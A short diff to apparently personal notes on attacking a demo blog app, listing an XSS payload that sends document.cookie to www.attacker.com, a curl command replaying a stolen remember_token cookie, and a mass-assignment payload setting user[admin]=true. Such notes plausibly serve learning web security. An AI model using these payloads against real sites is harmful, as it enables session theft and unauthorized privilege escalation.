@@ -14,11 +14,15 @@ CSS
 ---
 * Post this
 <pre>
-    <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+(<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>)
 </pre>
-
 
 
 XSRF
 ----
     curl "http://www.blog.com:3000/microposts/7" --cookie remember_token=XXXXXXXX
+
+
+Mass Asignment
+--------------
+user%5Badmin%5D=true
